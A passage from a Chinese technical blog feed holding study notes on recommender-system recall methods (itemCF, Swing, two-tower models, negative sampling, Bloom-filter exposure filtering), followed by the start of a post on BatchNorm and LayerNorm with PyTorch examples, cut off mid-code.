/></li><li>返回100个分数最高的物品作为召回结果</li></ul><p>总结:</p><p>使用索引离线计算量大, 线上计算量小. 不过离线本身计算不是太复杂都是可以接受的, 主要线上必须能够迅速给出结果, 这种方式线上可以快速得到反馈, 所以能够得到使用.</p><h2 id="swing">Swing</h2><p>类似itemCF, 不过区别的地方在于相似度计算, itemCF中物品重合用户越多表示越相似</p><p>Swing从另一个角度出发: 如果两个用户本身交集很小, 但是同时喜欢物品i和物品j, 那么说明i和j相似. 公式如下</p><p><span class="math display">\[s(i, j) = \sum_{u \in U_i \cap U_j} \sum_{v \in U_i \cap U_j} \frac{1}{\alpha + \left| I_u \cap I_v \right|}\]</span></p><p><code>$ U_i $</code>表示点击商品i的所有用户, <code>$ I_u $</code>表示用户u点击的所有商品, 翻译过来就是: 对于共同点击商品i,j的用户，如果用户之间共同点击的商品越少则商品 i,j 就越相似.</p><h2 id="usercf">userCF</h2><p><span class="math display">\[\sum_j sim(user, user_j) \times like(user_j, item)\]</span></p><p>几乎和itemCF完全一致,区别在于相似度为user与user之间. 另外就是userCF中存在一个降低热门物品权重的子问题, 当某用户的相似用户集里面很多人喜欢某个热门物品的时候, 我们应该降低热门物品的权重, 比如下图就采用了 1/log(1+热门程度)这种方式来解决此问题</p><p><img src="userCF.png" /></p><p>工业化使用流程也和itemCF很类似, 建立 <code>用户-&gt;物品</code> 索引和 <code>用户-&gt;用户</code> 索引, 然后快速返回最相似的k个用户和用户最喜欢的last_n个物品, 复杂度kn.</p><h2 id="矩阵补充not-working">矩阵补充(not working)</h2><p>思路非常简单: <strong>每个user对应一个embedding, 每个item对应一个embedding, 利用内积来预测用户评分从而学习embedding</strong>.</p><p>缺点:</p><ol type="1"><li>只利用了embedding, 其他所有信息都没有使用(比如物品的物品属性, 关键词, 地理位置等, 用户的性别,年龄,感兴趣类别等).<br /></li><li>其次, 负样本选择也有问题: 样本曝光之后被点击算正样本是正确的, 但是不点击并不代表是用户不感兴趣, 只能算作score没有真正的正样本高,这种样本其实本身应该被算作正样本, 最起码在召回阶段应该是正样本, 在后面的精排阶段算作负样本是可以的.<br /></li><li>训练方法只用了内积, 不如余弦相似度.<br /></li><li>最后是作者提到的矩阵补充使用regression, 就task type而言不如classification并表示工业界一般都是classification.</li></ol><h3 id="工业界做法复杂度处理">工业界做法(复杂度处理)</h3><p><strong>存储</strong>: 用户可以直接存kv表, 通过查询用户k从而得到用户的embedding值v. 而item的话因为数量庞大, 所以索引构造比较复杂, 从后面的内容来看, 似乎是通过将item分扇区来建立索引了.</p><p><strong>查找</strong>: 用户可以直接查表, 而求内积理论就需要枚举item然后获取向量然后求解. 但是这里存在问题, 如果靠枚举的话, 时间复杂度正比物品数量, 而物品的数量又特别庞大, 这是不可接受的.</p><p><strong>Approximate Nearest Neighbor Search</strong>: Milvus, Faiss, Hnswlib等系统就支持最近邻查找.</p><p>衡量标准也有如下:</p><ul><li>L2距离<br /></li><li>内积<br /></li><li>夹角余弦(cosine similarity)</li></ul><p>假如系统不支持余弦相似度, 可以对模做归一化, 从而内积即余弦相似度.</p><p>最近邻查找就是将点在空间中划分<strong>扇区</strong>, 取<strong>扇区代表向量</strong>与目标用户求相似度, 从而知道用户与哪一个扇区相似度较高. 进而我们通过扇区找到扇区内所有点, 再枚举所有点做内积. 这样复杂度可以从 <code>n</code> 变成 <code>$ \sqrt(n) $</code>.</p><h2 id="双塔模型">双塔模型</h2><h3 id="结构">结构</h3><p>类似矩阵召回, 但是是升级版. 矩阵召回直接将embedding做相似度计算, 而双塔模型则是将特征完全融合之后再求相似度.</p><p><img src="two_tower.png" /></p><ul><li>id信息会扩充为embedding; 离散特征类别少用one-hot, 类别多用多种embedding; 连续变量做归一化和一些简单预处理.<br /></li><li>concat之后feed到神经网络, 求出用户或者物品的表征.<br /></li><li>最后基于两个表征求余弦相似度.</li></ul><h3 id="训练">训练</h3><p>训练模式存在三种, pointwise, pairwise, listwise.</p><ol type="1"><li>pointwise: 独立看待每个样本, 然后做二分类. 鼓励正样本预测1, 负样本预测-1. 然后样本一般正:负=1:2或者1:3(作者原话:"我也不知道为什么但互联网大厂的人都这么做").<br /></li><li>pairwise: 正负样本每一组每一组地看. 基本思路是鼓励预测的正样本相似度大于负样本相似度; 如果cos(a, b+) - cos(a, b-) &gt; threshold, 则我们认为没有损失. 损失函数可以用triplet hinge loss: <code>$ L(a, b+, b-) = max\&#123;0, cos(a, b-) + threshold - cos(a, b+)\&#125; $</code>, 或者换成logistic也可以, 反正能正确反应正负样本关系即可.<br /></li><li>listwise: 取一个正样本和多个负样本, 然后用softmax和crossentropy, 目标是softmax之后的正样本趋近于1, 而负样本趋近于0.</li></ol><h3 id="正负样本">正负样本</h3><p><strong>正样本</strong>: 曝光且有点击的用户物品二元组.</p><p>问题: 少量物品会占大多数点击,导致正样本大多数是热门物品.</p><p>解决方案: 过采样冷门物品和降采样热门物品.</p><ul><li>过采样(up-sampling): 一个样本出现多次.<br /></li><li>降采样(down-sampling): 一些样本被抛弃.</li></ul><p><strong>负样本</strong>: 主要有三个阶段</p><ul><li>召回没被选到的 -&gt; 简单负样本<br /></li><li>粗排和精排没有选到的 -&gt; 困难负样本<br /></li><li>参加重排但是用户没有点击的 -&gt; 召回阶段应该被算作正样本, 排序阶段算负样本</li></ul><p><strong>简单负样本</strong>:<br />未被召回的物品大概率是用户不感兴趣的, 而未被召回的物品约等于全体物品, 所以可以直接从全体物品抽样做负样本.</p><p>但是如果<strong>均匀抽样</strong>, 因为大部分物品都是冷门物品, 那么相当于冷门物品更容易被当作负样本, 而正样本大多数是热门物品, 这样对冷门物品不公平.</p><p>所以一般采用<strong>非均匀抽样</strong>, 目的是<strong>打压热门物品</strong>, 负样本抽样概率和热门程度相关, 比如可以用采样概率正比于点击率的0.75次方来表示.</p><p>但这种方式在batch内采样可能会出现问题: 一个batch提供的是用户和物品的二元组, 用户点击了其中一个物品而没有点击其他物品, 从而保证有n*(n-1)个简单负样本. 然而一个batch中一个物品的出现概率是正比于其点击次数的, 物品成为负样本的概率本应该正比于点击率的0.75次方, 但是这里却变成了点击率的一次方: 这导致了对热门物品惩罚过狠, 会造成偏差.</p><p>小红书采用了<a href="https://dl.acm.org/doi/10.1145/3298689.3346996">Sampling-bias-corrected neural modeling for large corpus item recommendations</a>里的策略来做出调整, 具体做法如下:</p><ul><li>物品被抽样到的概率 <code>$ p_i \propto 点击次数 $</code>.<br /></li><li>一般用于预估用户兴趣采用的是 <code>$ cos(a, b_i) $</code>.<br /></li><li>做训练的时候应该调整为 <code>$ cos(a, b_i) - logp_i $</code> 从而避免对热门物品的过分打压, 而等线上做召回的时候还是用 <code>$ cos(a, b_i) $</code>.</li></ul><p><strong>困难负样本</strong>:</p><p>召回阶段淘汰的物品(全体物品, 即简单负样本): 容易区分<br />被粗排淘汰的物品(困难负样本): 比较难区分<br />精排靠后的物品(困难负样本): 非常难区分</p><p><strong>工业界做法</strong>:</p><p>混合几种负样本, 50%简单负样本, 50%是困难负样本</p><p><strong>为什么曝光为点击不可以用作负样本</strong></p><p><img src="neg_sample.png" /></p><h3 id="线上召回">线上召回</h3><p>双塔模型首先是特征提取部分, 这里分为用户特征和物品特征两部分.</p><p>其中物品特征由于计算量大, 所以我们必须选择离线计算存储的方式: 首先模型进行训练, 训练完毕之后我们把物品的特征向量存进向量数据库, 然后向量数据库建索引以方便查找. 之后线上有需求的时候直接通过索引取出物品特征.</p><p>而用户特征我们可以选择离线存储然后索引获取; 也可以选择线上直接算一个. 因为用户向量只有一个, 所以计算量不大, 线上实时计算是可以接受的. 这样做的好处是用户的兴趣随时变化的话我们也能够检测得到, 推荐效果会更好.</p><h3 id="全量更新和增量更新">全量更新和增量更新</h3><p>全量更新: 指的是每天一次, 在昨天的模型基础之上对昨天的新数据进行重新学习(类似LLM的全调参)</p><p>增量更新: 用户的兴趣随时会发生改变, 那么就需要实时收集线上数据做流式处理, 生成tfrecord然后对模型做增量更新(指学习embedding而不做神经网络的学习). 最后发布用户的id embedding供用户塔线上计算.</p><p><strong>只做增量不做全量更新会导致偏差</strong>: 短时间的流式信息是没有被shuffle的, 训练效果不如全量更新时shuffle来的效果好, 其次我个人理解是全量更新除此之外还会保持神经网络对embedding层的适应, 从而使模型效果更好.</p><h3 id="自监督学习">自监督学习</h3><p>解决问题: 推荐系统的头部效应-&gt;即少部分物品占大部分点击, 大部分物品展少量点击-&gt;高点击物品表征学得好,低点击物品表征学得差.</p><p>带自监督学习的双塔模型基本模型还是双塔模型, 不过loss由两部分构成: 一部分是mainLoss, 另一部分是selfloss(自监督loss).</p><p>第一部分的loss是crossentropy, 如下图. 其中数据取自batch, 每个用户对应一个item, 即1对n的listwise learning.</p><p><img src="two_tower_mainloss.png" /></p><p>上面这个损失函数还有点小问题, 即我们前面提到过的纠偏, 训练的时候 <code>$ cos(a_i, b_j) $</code> 得换成 <code>$ cos(a_i, b_j) - logp_j $</code>.</p><p><img src="twotower_mainloss_withbias.png" /></p><p>第二部分是自监督学习, 具体结构如下图</p><p><img src="twotower_self.png" /></p><p>具体想法就是对物品做特征变换,物品i可以生成特征bi'和bi'',物品j可以生成特征bj'和bj''.</p><p>然后我们的目标是</p><ol type="1"><li>让物品i和物品j的特征差异尽量大.<br /></li><li>而单个物品i经过不同特征变换的输出特征应该尽量相似.</li></ol><p><strong>特征变换种类</strong>:</p><ol type="1"><li>random mask: 随机挑选一些离散特征, 直接对其mask, 比如类目本来是{数码,摄影}, mask之后变成{default}.<br /></li><li>dropout: 如果物品是多值离散特征, 我们随机丢弃其中50%的值, 比如{数码,摄影}, dropout之后变成{数码}.<br /></li><li>互补特征: 相当于把特征split为两份, 两份互不重叠.<br /></li><li>mask关联特征: mask掉一系列关联性强的特征.</li></ol><p>对于关联特征这个仔细说一下: 我们取p(u)为u特征出现的概率, p(v)为v特征出现的概率, 那么我们可以用互信息(mutual information)来表示特征之间的关联.</p><p><span class="math display">\[MI(U,V) = \sum_{u \in U} \sum_{v \in V} p(u,v) \cdot log\frac{p(u,v)}{p(u)p(v)}\]</span></p><p><strong>做法</strong>: 假设有k个特征, 那么就可以构成k * k的特征矩阵, 然后我们随机选一个种子, 找到与种子最相关的k/2种特征, mask掉最相关的k/2, 然后保留剩下k/2.</p><p><strong>好处</strong>: 比其他的特征变换效果更好</p><p><strong>坏处</strong>: 方法复杂, 实现难度大, 不容易维护.</p><p>最终损失函数</p><p><img src="two_tower_loss.png" /></p><h2 id="deep-retrieval字节">Deep Retrieval(字节)</h2><p>类似阿里的TDM. 双塔模型把物品表示为向量, 而deep retrieval把物品表示为路径, 然后线上查找用户最匹配的路径.</p><p>整体步骤如下:</p><ol type="1"><li>给定用户特征x, 用神经网络预测用户对路径path = [a, b, c]的兴趣, 分数记为 p(path | x).<br /></li><li>用beam search来寻找分数p(path | x)最高的s条path.<br /></li><li>利用索引 path -&gt; List_item来召回路径上的n个物品.<br /></li><li>对返回的最多s*n个物品做初步排序, 然后返回分数最高的若干物品.</li></ol><h3 id="用户对路径的兴趣">用户对路径的兴趣</h3><p>假设路径为path = [a, b, c], 用户特征为x. 那么:</p><ul><li>给定x, 用户对节点a的兴趣为p1(a | x)<br /></li><li>给定x,a, 用户对节点b的兴趣为p2(b | a;x)<br /></li><li>给定x,a,b, 用户对节点c的兴趣为p3(c | a,b;x)</li></ul><p>最终用户对path = [a, b, c]的兴趣为:<br />p(a, b, c|x) = p1(a | x) * p2(b | a;x) * p3(c | a,b;x)</p><p><img src="x2abc.png" /></p><p>注意图中神经网络是不同的神经网络, 不共享参数.</p><h3 id="用户对路径的学习方式">用户对路径的学习方式</h3><p>首先这里为了让模型学到用户和路径的关系, 我们样本层面只用到了正样本, 即 click(user, item) = 1. 然后使用下面的思路训练神经网络</p><ul><li>假设物品可以表征为J条路径:[a1, a2, a3], ... [aj, bj, cj].<br /></li><li>用户的兴趣为 p(a, b, c|x) = p1(a | x) * p2(b | a;x) * p3(c | a,b;x)<br /></li><li>如果用户点击了物品说明用户对物品感兴趣<br /></li><li>那么就存在 <code>$ \sum_&#123;j=1&#125;^&#123;J&#125; p(a_j, b_j, c_j | x) $</code> 尽可能大.<br /></li><li>所以损失函数可以用 <code>$ loss = -log(\sum_&#123;j=1&#125;^&#123;J&#125; p(a_j, b_j, c_j | x)) $</code>.</li></ul><h3 id="学习物品表征">学习物品表征</h3><p>前面说到用户的兴趣为<code>$ p(a, b, c|x) = p_1(a | x) \times p_2(b | a;x) \times p_3(c | a,b;x) $</code>, 我们把这个表示为 <code>$ p(path | user) $</code>.</p><p>那么item和path的相关性就可以表示为:</p><p><span class="math display">\[score(item, path) = \sum_{user}p(path|user) \times click(user, item)\]</span></p><p>前面为用户对路径的兴趣, 后面为用户是否点击了物品. 然后我们依据score来选出J条路径作为item的表征.</p><p>即我们通过将user作为中介, 尝试获得item的路径表征.</p><p><strong>loss</strong>:<br />即然选出了J条路径 <code>$ \Pi = \&#123;path_1 ... path_j\&#125; $</code>来作为物品表征.</p><p>那么损失函数就可以写成</p><p><span class="math display">\[loss(item, \Pi) = - log(\sum_{j=1}^J score(item, path_j))\]</span></p><p>即路径与物品越相关, score就越大, loss就越小.</p><p><strong>regularization</strong>:</p><p>为了避免过多物品集中在一条path的情况, 我们加上正则项. <span class="math display">\[reg(path_j) = (number\,of\,items\,on\,path_j)^4.\]</span></p><h2 id="其他召回通道">其他召回通道</h2><p><strong>地理位置召回</strong>: GeoHash召回, 同城召回.</p><p><strong>作者召回</strong>: 关注的作者, 有交互的作者, 相似的作者.</p><p><strong>缓存召回</strong>: 设置缓存,复用前面做精排的结果. 缓存机制: 一旦成功曝光就移出缓存;超出缓存大小移除最先进入的;最多召回10次,达到后退场;最多保存3天,满3天退场.</p><h2 id="不适合召回的模型"><strong>不适合召回的模型</strong></h2><p>召回的目标是大量数据, 所以需求遍历的模型就不适合召回.</p><p><img src="non_recall.png" /></p><p>个人理解:</p><p>这个模型的神经网络需要用户和物品两边的特征输入并做前期的特征融合, 这种方法就必须<strong>线上</strong>使用神经网络跑一遍遍历, 复杂度不可接受.</p><p>对比之下双塔模型后期融合, 前期表征计算完毕可以直接存储, 需求计算相似度的时候直接依据索引取出, 复杂度仅在于相似度计算而不用线上再跑神经网络, 这才是召回应该采用的模型.</p><h2 id="曝光过滤">曝光过滤</h2><p>一般在召回阶段做, 如果用户看过某个物品, 那么大概率用户不会想再看一遍, 所以我们要在召回阶段把重复物品筛选下去.</p><p>如果某用户看过n个物品, 本次召回k个物品, 那么暴力对比会有nk复杂度. 复杂度较大, 因此需要优化.</p><h3 id="bloom-filter">bloom filter</h3><p>即做曝光过滤的方法之一.</p><p>方法: 其通过对物品hash然后写表的方式来做记录, 然后通过读取hash表的方式来判断是否以前存过这个物品.</p><p>因此如果bloom filter表示没记录过这个物品, 那么这个物品一定没被推过; 如果bloom filter表示这个物品以前记录过, 那么这个物品以前可能记录过也可能没记录过(存在误伤).</p><p><img src="bloomfilter.png" /></p><p>我们假设曝光物品集合大小为n, 二进制向量维度为m, 用了k个哈希函数. 那么bloom filter误伤的概率为</p><p><span class="math display">\[\delta \approx (1 - exp(-\frac{kn}{m}))^k\]</span></p><p>n越大, 向量的1越多, 越容易误伤; m越大, 向量空间越大, 越不容易碰撞; k太大太小都不好, 需要取最优.</p><p>作者给出最优参数(不太清楚怎么求的, 工业化场景吧).</p><p><span class="math display">\[k = 1.44 \cdot ln(\frac{1}{\delta}),  m = 2n \cdot ln(\frac{1}{\delta})\]</span></p><p><strong>实际业务图</strong></p><p><img src="bloomfilter_data.png" /></p><p>用户获取数据之后我们需要尽快写表来方便下次召回, 需要用实时流处理: 把曝光物品写kafka消息队列然后flink读取消息队列并计算物品hash并写到bloomfilter的表上.</p><p><strong>缺点</strong>:</p><p>只能添加物品不能删除物品, 即一旦向量被写入了1就不可从1写回0, 否则会影响其他物品.</p><p>如果我们想移除一个月前的曝光物品, 让bloomfilter不记录它们了来降低误伤率, 这只能通过重新计算二进制向量来实现.</p>]]></content>
      
      
      <categories>
          
          <category> ML Recommender System </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Norm相关</title>
      <link href="/2024/05/08/Norm%E7%9B%B8%E5%85%B3/"/>
      <url>/2024/05/08/Norm%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>本来是不打算写的, 不过最近看各种东西老是能碰到norm的问题, 所以还是单独记录一下.</p><h2 id="batchnorm">BatchNorm</h2><p>对batch维度做norm, 常见1D和2D.</p><p>1D在nlp领域,输入: N,C,L 然后num_features为C的大小,对L做norm</p><p>2D在图像处理,输入: N,C,H,W,然后num_features为C,对HW做norm</p><p>example:</p><p>1D:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: x = torch.arange(<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>, dtype=torch.<span class="built_in">float</span>).reshape(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: x[<span class="number">0</span>], x[<span class="number">1</span>]</span><br><span class="line">Out[<span class="number">3</span>]:</span><br><span class="line">(tensor([[<span class="number">0.</span>, <span class="number">1.</span>],</span><br><span class="line">         [<span class="number">2.</span>, <span class="number">3.</span>]]),</span><br><span class="line"> tensor([[<span class="number">4.</span>, <span class="number">5.</span>],</span><br><span class="line">         [<span class="number">6.</span>, <span class="number">7.</span>]]))</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: mean = np.mean([<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: std = np.std([<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: norm = <span class="keyword">lambda</span> x:(x-mean)/std</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>]:</span><br><span class="line">   ...:     <span class="built_in">print</span>(norm(i))</span><br><span class="line">   ...:</span><br><span class="line">-<span class="number">1.212678125181665</span></span><br><span class="line">-<span class="number">0.7276068751089989</span></span><br><span class="line"><span class="number">0.7276068751089989</span></span><br><span class="line"><span class="number">1.212678125181665</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: mean = np.mean([<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: std = np.std([<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>]:</span><br><span class="line">    ...:     <span class="built_in">print</span>(norm(i))</span><br><span class="line">    ...:</span><br><span class="line">-<span class="number">1.212678125181665</span></span><br><span class="line">-<span class="number">0.7276068751089989</span></span><br><span class="line"><span class="number">0.7276068751089989</span></span><br><span class="line"><span class="number">1.212678125181665</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: BNlayer = torch.nn.BatchNorm1d(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: BNlayer(x)</span><br><span class="line">Out[<span class="number">16</span>]:</span><br><span class="line">tensor([[[-<span class="number">1.2127</span>, -<span class="number">0.7276</span>],</span><br><span class="line">         [-<span class="number">1.2127</span>, -<span class="number">0.7276</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">0.7276</span>,  <span class="number">1.2127</span>],</span><br><span class="line">         [ <span class="number">0.7276</span>,  <span class="number">1.2127</span>]]], grad_fn=&lt;NativeBatchNormBackward0&gt;)</span><br></pre></td></tr></table></figure><p>2D类似,不过norm就像字面意思,norm维度变成了2维:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: x = torch.arange(<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>, dtype=torch.<span class="built_in">float</span>).reshape(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: x</span><br><span class="line">Out[<span class="number">21</span>]:</span><br><span class="line">tensor([[[[ <span class="number">0.</span>,  <span class="number">1.</span>],</span><br><span class="line">          [ <span class="number">2.</span>,  <span class="number">3.</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">4.</span>,  <span class="number">5.</span>],</span><br><span class="line">          [ <span class="number">6.</span>,  <span class="number">7.</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[ <span class="number">8.</span>,  <span class="number">9.</span>],</span><br><span class="line">          [<span class="number">10.</span>, <span class="number">11.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">12.</span>, <span class="number">13.</span>],</span><br><span class="line">          [<span class="number">14.</span>, <span class="number">15.</span>]]]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: x[<span class="number">0</span>], x[<span class="number">1</span>]</span><br><span class="line">Out[<span class="number">22</span>]:</span><br><span class="line">(tensor([[[<span class="number">0.</span>, <span class="number">1.</span>],</span><br><span class="line">          [<span class="number">2.</span>, <span class="number">3.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">4.</span>, <span class="number">5.</span>],</span><br><span class="line">          [<span class="number">6.</span>, <span class="number">7.</span>]]]),</span><br><span class="line"> tensor([[[ <span class="number">8.</span>,  <span class="number">9.</span>],</span><br><span class="line">          [<span class="number">10.</span>, <span class="number">11.</span>]],</span><br><span class="line"></span><br><span class="line">         [[<span class="number">12.</span>, <span class="number">13.</span>],</span><br><span class="line">          [<span class="number">14.</span>, <span class="number">15.</span>]]]))</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: mean = np.mean([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: std = np.std([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]:</span><br><span class="line">    ...:     <span class="built_in">print</span>(norm(i))</span><br><span class="line">    ...:</span><br><span class="line">-<span class="number">1.3242443839434612</span></span><br><span class="line">-<span class="number">1.0834726777719228</span></span><br><span class="line">-<span class="number">0.8427009716003844</span></span><br><span class="line">-<span class="number">0.601929265428846</span></span><br><span class="line"><span class="number">0.601929265428846</span></span><br><span class="line"><span class="number">0.8427009716003844</span></span><br><span class="line"><span class="number">1.0834726777719228</span></span><br><span class="line"><span class="number">1.3242443839434612</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">26</span>]: bn2d = torch.nn.BatchNorm2d(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: bn2d(x)</span><br><span class="line">Out[<span class="number">27</span>]:</span><br><span class="line">tensor([[[[-<span class="number">1.3242</span>, -<span class="number">1.0835</span>],</span><br><span class="line">          [-<span class="number">0.8427</span>, -<span class="number">0.6019</span>]],</span><br><span class="line"></span><br><span class="line">         [[-<span class="number">1.3242</span>, -<span class="number">1.0835</span>],</span><br><span class="line">          [-<span class="number">0.8427</span>, -<span class="number">0.6019</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        [[[ <span class="number">0.6019</span>,  <span class="number">0.8427</span>],</span><br><span class="line">          [ <span class="number">1.0835</span>,  <span class="number">1.3242</span>]],</span><br><span class="line"></span><br><span class="line">         [[ <span class="number">0.6019</span>,  <span class="number">0.8427</span>],</span><br><span class="line">          [ <span class="number">1.0835</span>,  <span class="number">1.3242</span>]]]], grad_fn=&lt;NativeBatchNormBackward0&gt;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="bn的batchsize相关">BN的batchsize相关</h3><p>如果模型选择了BN,那么一定得注意batchsize的选择问题,毕竟是batch-wise的norm, 虽然你可以设置batchsize为1, 但那样就等同于instance norm了, BN的作用是对每个batch做normalization, 为了让同batch的分布一致, 可能更适用于分类问题.</p><h3 id="conv-bn">conv + BN</h3><p>conv输出的时候可以带bias, 但是如果后面是BN, 那么bias就可以带可以不带.</p><p>因为假设输出为x:</p><p>x -&gt; (mean_x, var_x)</p><p>x+b -&gt; (mean_x + b, var_x)</p><p>所以BN之后:</p><p>(x - mean_x) / std_x == (x+b - mean_x - b) / std_x</p><p>因此bias带不带没影响.</p><h3 id="ldmstable-diffusion">LDM/Stable Diffusion</h3><p>最近一直也在调LDM, 其中发现的一个问题就是自己写的时候带了BatchNorm, 但是又考虑到GPU大小问题, batchsize只能设置2.</p><p>于是回头看了下CompVis它们的代码, 发现他们的batchsize也是设置的4, 大概也是觉得batchsize太小用BN不合适, 他们norm也是选择了使用groupnorm.</p><h2 id="layernorm">LayerNorm</h2><p>区别于batchnorm, layernorm是依据你输入的维度来做norm.</p><p>更直观的说, 就是从batch里面每次取出一个sample(区别于batchnorm,即not batch-wise), 然后从这个sample里面每次取出instance, 这个instance的大小是自己指定, 然后对这个instance做norm, 然后取下一个instance.</p><p>比如下面这个例子, batch大小为2, 设置为layernorm((2,2,2)), 那么每次循环从sample 1取出一个2<em>2</em>2张量做norm, 同理设置为(2,2), 那么就会取出2*2来做norm, 一个sample结束了之后再取sample 2然后norm.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 